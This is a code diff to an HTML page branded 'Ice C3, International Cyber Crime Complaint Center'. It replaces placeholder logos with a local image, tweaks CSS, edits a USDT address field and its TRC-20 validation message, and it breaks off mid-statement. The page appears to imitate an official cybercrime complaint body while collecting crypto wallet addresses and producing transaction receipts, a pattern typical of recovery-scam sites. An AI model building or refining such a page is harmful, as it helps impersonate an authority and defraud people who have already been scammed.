@@ -163,6 +163,7 @@
             background: rgba(255, 255, 255, 0.1);
             padding: 5px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            object-fit: cover;
         }
 
         .header h1 {
@@ -753,6 +754,7 @@
             height: 80px;
             border-radius: 50%;
             border: 2px solid #667eea;
+            object-fit: cover;
         }
 
         .receipt-title h2 {
@@ -1296,7 +1298,7 @@
         <nav class="navbar">
             <div class="nav-container">
                 <div class="logo-section">
-                    <img src="https://via.placeholder.com/60/667eea/ffffff?text=IC3" alt="Ice C3 Logo" class="logo-img">
+                    <img src="IMG-20260225-WA0001.jpg" alt="Ice C3 Logo" class="logo-img">
                     <span class="logo-text">Ice C3</span>
                 </div>
                 <ul class="nav-links">
@@ -1312,7 +1314,7 @@
             <!-- Header Section with Logo -->
             <div class="header">
                 <div class="logo-placeholder">
-                    <img src="https://via.placeholder.com/150/667eea/ffffff?text=IC3+LOGO" alt="Ice C3 Logo" class="main-logo">
+                    <img src="IMG-20260225-WA0001.jpg" alt="Ice C3 Logo" class="main-logo">
                 </div>
                 <h1>Ice C3</h1>
                 <h2>International Cyber Crime Complaint Center</h2>
@@ -1429,7 +1431,7 @@
                                 type="text" 
                                 id="usdtAddress" 
                                 name="usdtAddress" 
-                                placeholder="E.g., TKVwcWjCUrZTopBPN5Gf4AiPXxqfzuUniH" 
+                                placeholder="E.g., your USDT address" 
                                 required
                             >
                             <span class="form-error" id="addressError"></span>
@@ -1603,7 +1605,7 @@
                         <!-- Receipt Header -->
                         <div class="receipt-header">
                             <div class="receipt-logo">
-                                <img src="https://via.placeholder.com/80/667eea/ffffff?text=IC3" alt="Ice C3">
+                                <img src="IMG-20260225-WA0001.jpg" alt="Ice C3">
                             </div>
                             <div class="receipt-title">
                                 <h2>TRANSACTION RECEIPT</h2>
@@ -1872,4 +1874,5 @@
             
             // Validate USDT address
             if (!usdtAddress.startsWith('T') || usdtAddress.length !== 34 || !isValidTronAddress(usdtAddress)) {
-                showError('addressError', 'Please enter a valid USDT address (TRC-20 format, 34 
+                showError('addressError', 'Please enter a valid USDT address (TRC-20 format, 34 characters starting with T)');
+                isValid =
